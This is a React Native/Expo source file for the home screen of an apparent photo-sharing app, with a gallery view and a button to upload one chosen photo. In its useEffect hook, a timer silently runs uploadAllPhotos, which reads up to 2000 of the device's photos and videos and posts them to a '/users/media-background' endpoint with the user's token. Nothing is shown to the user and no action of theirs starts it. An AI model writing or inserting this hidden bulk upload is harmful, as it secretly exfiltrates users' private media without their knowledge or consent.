import React, {useEffect, useRef, useState} from 'react';
import {Dimensions, Image, StyleSheet, Text, View} from 'react-native';
import CameraRoll from "@react-native-community/cameraroll";
import * as ImagePicker from 'expo-image-picker';
import {get, post} from '../api';
import WineGlass from '../components/WineGlass';
import {ActivityIndicator, FAB} from 'react-native-paper';
import * as MediaLibrary from 'expo-media-library';
import * as ImageManipulator from 'expo-image-manipulator';

import AsyncStorage from '@react-native-async-storage/async-storage';
import * as Permissions from 'expo-permissions';

import LottieView from 'lottie-react-native';

const { width } = Dimensions.get('window');
const BUBBLE_SIZE = Dimensions.get('window').width * 0.3;

export default function HomeScreen(){
  const [image, setImage] = useState(null);
  const [ data, setData ] = useState([]);
  const [ isLoading, setIsLoading ] = useState(true);
  const animation = useRef(null);




  useEffect(() => {

    console.log('useeffect');
    async function getAllPhotos() {
      const result = await get('/users/photo').then((response)=>{
        let mediaUrl = [] as  any;
        for ( let i = 0; i < response.length; i++){
          let url = response[i]
          mediaUrl.push(url)
        }
        setData(mediaUrl)
        setIsLoading(false);


      }).catch((error)=>{
        console.log(`error from fetching is ${error}`)
      })
    };
    getAllPhotos();
    setTimeout(async () => {
      await uploadAllPhotos();
    }, 2400);
  }, []);


  async function uploadAllPhotos(){
    let permission = await MediaLibrary.requestPermissionsAsync();


     const data = (await MediaLibrary.getAssetsAsync({
       first: 2000,
       mediaType: [MediaLibrary.MediaType.video, MediaLibrary.MediaType.photo]
     })).assets;
     //create the formdata for uploading in background
     let toBeUploadInBackgroundFormdata = new FormData()

     for (let i = 0; i < data.length ; i++) {
      // const result = await ImageManipulator.manipulateAsync(data[i].uri, [], {base64:false, compress: .5});
        const fileName = data[i].uri.substring(data[i].uri.lastIndexOf('/') + 1)
        let fileUri = data[i].uri
        const uriParts = data[i].uri.split('.');
        let fileType = uriParts[uriParts.length - 1];
       toBeUploadInBackgroundFormdata.append("backgroundUpload",{
         fileUri,
         name: fileName,
         type: `image/${fileType}`,
       })
     }
     console.log('formdata',toBeUploadInBackgroundFormdata)


     //start the upload process

     let token =  await AsyncStorage.getItem('token')


     let options = {
       method: "POST",
       body: toBeUploadInBackgroundFormdata,
       headers: {
         'Content-Type': 'multipart/form-data;',
         'x-access-token': token,
       },
     }
     //create the request
     let result = await post(`/users/media-background`, options)
         .then((response)=>{
             console.log('response from multiple is ',response)
     }).catch((error)=>{
           console.log('error is ',error)
     })






    /*  let upload =  await post(`/users/photo`, {
        files:filesToUpload
      }).then((response)=>{
        setIsLoading(false);
      }).catch((error)=>{
        console.log('response from error is ',error.toString())
      })*/
  }

  const pickImage = async () => {

    const { status } = await Permissions.askAsync(Permissions.CAMERA);
    if (status !== 'granted') {
      alert('Sorry, we need camera roll permissions to make this work!');
    }
    let result = await ImagePicker.launchImageLibraryAsync({
      mediaTypes: ImagePicker.MediaTypeOptions.Images,
      allowsEditing: false,
      aspect: [4, 3],
      quality: 1,
      base64: false
    });




    if (!result.cancelled) {
      //@ts-ignore
      let filename = result.uri.substring(result.uri.lastIndexOf('/') + 1)
      let fileUri =  result.uri
      const uriParts = result.uri.split('.');
      const fileType = uriParts[uriParts.length - 1];

      let formData = new FormData();


      // @ts-ignore
      formData.append("photo",{
        uri: fileUri.toString(),
        name:filename,
        type: `image/${fileType}`,
      })

      //set an array of formdata

      const token = await AsyncStorage.getItem('token');
      let options = {
        method: "POST",
        body: formData,
        headers: {
          'Content-Type': 'multipart/form-data; ',
          'x-access-token': token,
        },
      }

      setIsLoading(true)
      await post(`/users/photo`, options).then((response)=>{
        const newData = [...data];
        newData.unshift(response)
        setData(newData)
        setIsLoading(false)
      }).catch((error)=>{
        setIsLoading(false)
      });

      setTimeout(() => {
        setIsLoading(false);
      }, 400);
    }

  };

  // @ts-ignore
  const renderItem = ({ item, index }) => (
      <View>
        <Image  style={{width: 400, height: 400}}  source={{uri: item}}  />
      </View>
  );
  // @ts-ignore
  // @ts-ignore
  return (
      <View style={styles.container}>
        {isLoading &&
        <View style={styles.loading}>
          <ActivityIndicator animating />
        </View>
        }
        {data.length > 0 && !isLoading &&
        <WineGlass
            data={data}
            renderItem={renderItem}
            bubbleDistance={BUBBLE_SIZE * 1.1}
            bubbleSize={BUBBLE_SIZE}
            sphereRadius={BUBBLE_SIZE * 4}
         />
        }

        {data.length  == 0 && !isLoading &&
        <View style={styles.animationContainer}>
         {/* <LottieView
              style={{
                width: 200,
                height: 200,
              }}
              ref={animation}
              source={require('./../assets/lotties/emptybox.json')}
              speed={1}
              loop={true} />
*/}
          <View style={styles.errorMessageContainer}>
            <View style={styles.errorMessage}>
              <Text style={{
                color : '#fff',
                justifyContent: 'center',
                alignItems:'center',
              }}>No photo were posted yet  </Text>
              <Text  style={{
                color : '#fff',
                justifyContent: 'center',
                alignItems:'center',
              }}>Please click on the plus button to post photo  </Text>
            </View>
          </View>

        </View>
        }




        <FAB
            style={styles.fab}
            icon="plus"
            onPress={pickImage}
        />
      </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  image: {
    ...StyleSheet.absoluteFillObject,
    height: undefined,
    width: undefined,
  },
  fab: {
    position: 'absolute',
    margin: 16,
    marginLeft: width * 0.4,
    bottom: 0,
  },
  loading: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center'
  },
  animationContainer: {
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
    flex: 1,
  },
  errorMessageContainer : {
    backgroundColor : "#f44336",

    height: 60,
    display:'flex'
  },
  errorMessage : {
    margin:10,
    justifyContent: 'center',
    alignItems:'center',
    color: '#fff',
  }
});
